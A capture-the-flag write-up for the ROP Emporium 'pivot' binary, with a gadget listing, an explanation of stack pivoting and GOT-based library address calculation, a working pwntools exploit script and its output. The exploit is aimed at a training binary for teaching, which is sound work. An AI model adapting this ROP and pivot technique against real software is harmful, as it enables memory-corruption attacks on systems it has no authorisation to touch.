# Writeup: pivot

## Introduction

This challenge introduces us to the concept of the "stack pivot". You might want to use a stack pivot when you don't have enough room on the stack to write your ROP chain. My strategy is as follows: Write the ROP chain to the heap and then perform a stack pivot. Simple enough, but this is trickier than I first thought. The function that we want to call is in a library that has PIE enabled meaning there are no fixed addresses for these library functions. The good news is that we can know what these addresses are because they are populated in the plt and the got. The plt is like a list of references that link back to the got. The problem is that in order to allow binaries to start up quickly the got starts off populated with pointers that point back to the plt stubs until a function is called at which point it then populates the table with the correct address. Since all functions in a shared library are always loaded the same distance apart, knowing one real address lets us calculate any other. Meaning we can calculate the distance between the ret2win function and any library functions and obtain the flag.

## Finding the Library Function

Looking through the dissassembled code of the binary in gdb I was able to find a few functions.

```
    void pwnme(char * pivot)
    {
            char buffer[0x20];
            memset(buffer, 0, 0x20);
            puts("Call ret2win() from libpivot");
            printf("The Old Gods kindly bestow upon you a place to pivot: %p\n", pivot);
            read(0, pivot, 0x100);
            puts("Thank you!\n");
            puts("Now please send your stack smash");
            printf("> ");
            read(0, buffer, 0x40);
            printf("Thank you!");
    }

    void uselessFunction()
    {
            foothold_function();
            exit(1);
    }

    int main()
    {
            setvbuf(stdout, 0, 2, 0);
            puts("pivot by ROP Emporium");
            puts("x86_64\n");
            char * buffer = malloc(0x1000000);
            if(buffer == NULL)
            {
                    puts("Failed to request space for pivot stack");
                    exit(1);
            }
            pwnme(buffer + 0xffff00);
            free(buffer);
            puts("\nExiting");
            return 0;
    }
```

You can see that there is a foothold function being called in the useless function. This function is a library function. It is clearer if we look at the actual assembly.

```
       0x00000000004009a8 <+0>:     push   rbp
       0x00000000004009a9 <+1>:     mov    rbp,rsp
       0x00000000004009ac <+4>:     call   0x400720 <foothold_function@plt>
       0x00000000004009b1 <+9>:     mov    edi,0x1
       0x00000000004009b6 <+14>:    call   0x400750 <exit@plt>    
```

Now that we have our library function to help us calculate the distance we can start looking for useful gadgets.

## Finding The Gadgets

To start of we can use ROPgadget to list all gadgets available to us in the binary.

```
    0x00000000004007be : adc byte ptr [rax], ah ; jmp rax
    0x0000000000400732 : adc cl, byte ptr [rcx] ; and byte ptr [rax], al ; push 6 ; jmp 0x4006c0
    0x0000000000400789 : add ah, dh ; nop dword ptr [rax + rax] ; ret
    0x0000000000400717 : add al, 0 ; add byte ptr [rax], al ; jmp 0x4006c0
    0x0000000000400916 : add al, bpl ; ret
    0x00000000004006f7 : add al, byte ptr [rax] ; add byte ptr [rax], al ; jmp 0x4006c0
    0x0000000000400917 : add al, ch ; ret
    0x00000000004009c2 : add bl, al ; add rax, rbp ; ret
    0x000000000040078f : add bl, dh ; ret
    0x0000000000400a3d : add byte ptr [rax], al ; add bl, dh ; ret
    0x0000000000400a3b : add byte ptr [rax], al ; add byte ptr [rax], al ; add bl, dh ; ret
    0x00000000004006d7 : add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x4006c0
    0x00000000004008eb : add byte ptr [rax], al ; add byte ptr [rax], al ; leave ; ret
    0x000000000040083c : add byte ptr [rax], al ; add byte ptr [rax], al ; push rbp ; mov rbp, rsp ; pop rbp ; jmp 0x4007d0
    0x0000000000400a3c : add byte ptr [rax], al ; add byte ptr [rax], al ; ret
    0x000000000040083d : add byte ptr [rax], al ; add byte ptr [rbp + 0x48], dl ; mov ebp, esp ; pop rbp ; jmp 0x4007d0
    0x00000000004008ec : add byte ptr [rax], al ; add cl, cl ; ret
    0x00000000004006d9 : add byte ptr [rax], al ; jmp 0x4006c0
    0x00000000004008ed : add byte ptr [rax], al ; leave ; ret
    0x00000000004007c6 : add byte ptr [rax], al ; pop rbp ; ret
    0x000000000040083e : add byte ptr [rax], al ; push rbp ; mov rbp, rsp ; pop rbp ; jmp 0x4007d0
    0x000000000040078e : add byte ptr [rax], al ; ret
    0x00000000004007c5 : add byte ptr [rax], r8b ; pop rbp ; ret
    0x000000000040078d : add byte ptr [rax], r8b ; ret
    0x000000000040083f : add byte ptr [rbp + 0x48], dl ; mov ebp, esp ; pop rbp ; jmp 0x4007d0
    0x0000000000400827 : add byte ptr [rcx], al ; pop rbp ; ret
    0x0000000000400752 : add cl, byte ptr [rcx] ; and byte ptr [rax], al ; push 8 ; jmp 0x4006c0
    0x00000000004008ee : add cl, cl ; ret
    0x00000000004006e7 : add dword ptr [rax], eax ; add byte ptr [rax], al ; jmp 0x4006c0
    0x0000000000400828 : add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax + rax] ; ret
    0x0000000000400707 : add eax, dword ptr [rax] ; add byte ptr [rax], al ; jmp 0x4006c0
    0x00000000004009c5 : add eax, ebp ; ret
    0x00000000004006b3 : add esp, 8 ; ret
    0x00000000004009c4 : add rax, rbp ; ret
    0x00000000004006b2 : add rsp, 8 ; ret
    0x0000000000400788 : and byte ptr [rax], al ; hlt ; nop dword ptr [rax + rax] ; ret
    0x00000000004006d4 : and byte ptr [rax], al ; push 0 ; jmp 0x4006c0
    0x00000000004006e4 : and byte ptr [rax], al ; push 1 ; jmp 0x4006c0
    0x00000000004006f4 : and byte ptr [rax], al ; push 2 ; jmp 0x4006c0
    0x0000000000400704 : and byte ptr [rax], al ; push 3 ; jmp 0x4006c0
    0x0000000000400714 : and byte ptr [rax], al ; push 4 ; jmp 0x4006c0
    0x0000000000400724 : and byte ptr [rax], al ; push 5 ; jmp 0x4006c0
    0x0000000000400734 : and byte ptr [rax], al ; push 6 ; jmp 0x4006c0
    0x0000000000400744 : and byte ptr [rax], al ; push 7 ; jmp 0x4006c0
    0x0000000000400754 : and byte ptr [rax], al ; push 8 ; jmp 0x4006c0
    0x00000000004006a9 : and byte ptr [rax], al ; test rax, rax ; je 0x4006b2 ; call rax
    0x0000000000400712 : and cl, byte ptr [rcx] ; and byte ptr [rax], al ; push 4 ; jmp 0x4006c0
    0x00000000004009a4 : call qword ptr [rax + 0x4855c3c9]
    0x0000000000400b93 : call qword ptr [rax - 0x2d000000]
    0x0000000000400c8b : call qword ptr [rbx]
    0x00000000004006b0 : call rax
    0x00000000004006e2 : cmp cl, byte ptr [rcx] ; and byte ptr [rax], al ; push 1 ; jmp 0x4006c0
    0x0000000000400a1c : fmul qword ptr [rax - 0x7d] ; ret
    0x000000000040078a : hlt ; nop dword ptr [rax + rax] ; ret
    0x0000000000400843 : in eax, 0x5d ; jmp 0x4007d0
    0x00000000004006ae : je 0x4006b2 ; call rax
    0x00000000004007b9 : je 0x4007c8 ; pop rbp ; mov edi, 0x601070 ; jmp rax
    0x00000000004007fb : je 0x400808 ; pop rbp ; mov edi, 0x601070 ; jmp rax
    0x00000000004002d0 : jmp 0x4002a5
    0x00000000004006db : jmp 0x4006c0
    0x0000000000400845 : jmp 0x4007d0
    0x0000000000400c23 : jmp qword ptr [rax]
    0x0000000000400cab : jmp qword ptr [rbp]
    0x00000000004007c1 : jmp rax
    0x00000000004009ba : lcall [rax - 0x3d] ; xchg rax, rsp ; ret
    0x00000000004008ef : leave ; ret
    0x0000000000400822 : mov byte ptr [rip + 0x20084f], 1 ; pop rbp ; ret
    0x00000000004008ea : mov eax, 0 ; leave ; ret
    0x00000000004009c1 : mov eax, dword ptr [rax] ; ret
    0x0000000000400842 : mov ebp, esp ; pop rbp ; jmp 0x4007d0
    0x00000000004007bc : mov edi, 0x601070 ; jmp rax
    0x00000000004009c0 : mov rax, qword ptr [rax] ; ret
    0x0000000000400841 : mov rbp, rsp ; pop rbp ; jmp 0x4007d0
    0x00000000004009a5 : nop ; leave ; ret
    0x00000000004007c3 : nop dword ptr [rax + rax] ; pop rbp ; ret
    0x000000000040078b : nop dword ptr [rax + rax] ; ret
    0x0000000000400805 : nop dword ptr [rax] ; pop rbp ; ret
    0x0000000000400824 : or byte ptr [r8], r12b ; add byte ptr [rcx], al ; pop rbp ; ret
    0x0000000000400825 : or byte ptr [rax], ah ; add byte ptr [rcx], al ; pop rbp ; ret
    0x0000000000400757 : or byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x4006c0
    0x0000000000400742 : or cl, byte ptr [rcx] ; and byte ptr [rax], al ; push 7 ; jmp 0x4006c0
    0x0000000000400a2c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
    0x0000000000400a2e : pop r13 ; pop r14 ; pop r15 ; ret
    0x0000000000400a30 : pop r14 ; pop r15 ; ret
    0x0000000000400a32 : pop r15 ; ret
    0x00000000004009bb : pop rax ; ret
    0x0000000000400844 : pop rbp ; jmp 0x4007d0
    0x00000000004007bb : pop rbp ; mov edi, 0x601070 ; jmp rax
    0x0000000000400a2b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
    0x0000000000400a2f : pop rbp ; pop r14 ; pop r15 ; ret
    0x00000000004007c8 : pop rbp ; ret
    0x0000000000400a33 : pop rdi ; ret
    0x0000000000400a31 : pop rsi ; pop r15 ; ret
    0x0000000000400a2d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
    0x00000000004006d6 : push 0 ; jmp 0x4006c0
    0x00000000004006e6 : push 1 ; jmp 0x4006c0
    0x00000000004006f6 : push 2 ; jmp 0x4006c0
    0x0000000000400706 : push 3 ; jmp 0x4006c0
    0x0000000000400716 : push 4 ; jmp 0x4006c0
    0x0000000000400726 : push 5 ; jmp 0x4006c0
    0x0000000000400736 : push 6 ; jmp 0x4006c0
    0x0000000000400746 : push 7 ; jmp 0x4006c0
    0x0000000000400756 : push 8 ; jmp 0x4006c0
    0x0000000000400840 : push rbp ; mov rbp, rsp ; pop rbp ; jmp 0x4007d0
    0x00000000004006b6 : ret
    0x00000000004006ad : sal byte ptr [rdx + rax - 1], 0xd0 ; add rsp, 8 ; ret
    0x0000000000400722 : sbb cl, byte ptr [rcx] ; and byte ptr [rax], al ; push 5 ; jmp 0x4006c0
    0x0000000000400702 : sub cl, byte ptr [rcx] ; and byte ptr [rax], al ; push 3 ; jmp 0x4006c0
    0x0000000000400a45 : sub esp, 8 ; add rsp, 8 ; ret
    0x0000000000400a44 : sub rsp, 8 ; add rsp, 8 ; ret
    0x0000000000400a3a : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret
    0x0000000000400914 : test eax, 0xe800400a ; ret
    0x00000000004006ac : test eax, eax ; je 0x4006b2 ; call rax
    0x00000000004006ab : test rax, rax ; je 0x4006b2 ; call rax
    0x00000000004009be : xchg eax, esp ; ret
    0x00000000004009bd : xchg rax, rsp ; ret
    0x00000000004006f2 : xor cl, byte ptr [rcx] ; and byte ptr [rax], al ; push 2 ; jmp 0x4006c0
```

As you can see there are quite a few gadgets, but in this challenge we will be using these.

```
    POP RAX; RET
    XCHG RAX, RSP ; RET
    MOV RAX, QWORD PTR [rax] ; RET
    POP RBP ; RET
    ADD RAX, RBP ; RET
    CALL RAX ; ret
```
I will explain why we use these gadgets by showing you the execution flow. First we will call the foothold function, then we will load rax with the got address of the foothold function into rax now populated in the got because we called it (POP RAX). Next we will load the actual address of the foothold function by dereferencing the got address in rax and moving it into rax (MOV RAX, QWORD PTR [RAX]). After we will load the distance between the ret2win function and the foothold function into rbp (POP RBP) and then we will add rbp to rax (ADD RAX, RBP). Finally, we will call the address in RAX which should be the address of the ret2win function (CALL RAX). To perform the stack pivot we load the heap address (which is given to us everytime we run the program) into RAX (POP RAX) and then swap RAX with RSP (XCHG RAX, RSP), redirecting execution to our heap chain.

## Results

Now all that is left is to write the script and run it.

### Script

```
    from pwn import *

    p = process('./pivot')
    libp = ELF('./libpivot.so')
    e = ELF('./pivot')

    foothold_plt = e.plt['foothold_function']
    foothold_got = e.got['foothold_function']

    ret2win_offset = libp.symbols['ret2win']
    foothold_offset = libp.symbols['foothold_function']
    p.recvuntil(b'pivot: ')
    pivot = int(p.recvline(), 16)

    print(f'{hex(pivot)}')

    POP_RAX = 0x00000000004009bb # POP RAX; RET
    XCHG = 0x00000000004009bd # XCHG RAX, RSP ; RET
    MOV_RAX = 0x00000000004009c0 # MOV RAX, QWORD PTR [rax] ; RET
    POP_RBP = 0x00000000004007c8 # POP RBP ; RET
    ADD_RAX = 0x00000000004009c4 # ADD RAX, RBP ; RET
    CALL_RAX = 0x00000000004006b0 # CALL RAX ; ret
    padding = b'A' * 40

    payload = p64(foothold_plt) + p64(POP_RAX) + p64(foothold_got) + p64(MOV_RAX) + p64(POP_RBP) + p64(ret2win_offset - foothold_offset) + p64(ADD_RAX) + p64(CALL_RAX)

    p.recvuntil(b'> ')
    p.sendline(payload)
    payload = padding + p64(POP_RAX) + p64(pivot) + p64(XCHG)
    p.recvuntil(b'> ')
    p.sendline(payload)
    p.interactive()
```

Now we run it.

```
    [+] Starting local process './pivot': pid 76440
    [*] '/mnt/c/Users/18506/Desktop/CTF/pivot/libpivot.so'
        Arch:     amd64-64-little
        RELRO:    Partial RELRO
        Stack:    No canary found
        NX:       NX enabled
        PIE:      PIE enabled
    [*] '/mnt/c/Users/18506/Desktop/CTF/pivot/pivot'
        Arch:     amd64-64-little
        RELRO:    Partial RELRO
        Stack:    No canary found
        NX:       NX enabled
        PIE:      No PIE (0x400000)
        RUNPATH:  b'.'
    0x7fe249decf10
    [*] Switching to interactive mode
    Thank you!
    foothold_function(): Check out my .got.plt entry to gain a foothold into libpivot
    ROPE{a_placeholder_32byte_flag!}
    [*] Got EOF while reading in interactive
    $
    [*] Process './pivot' stopped with exit code 0 (pid 76440)
    [*] Got EOF while sending in interactive
```

Finally, we have the flag.

`ROPE{a_placeholder_32byte_flag!}`

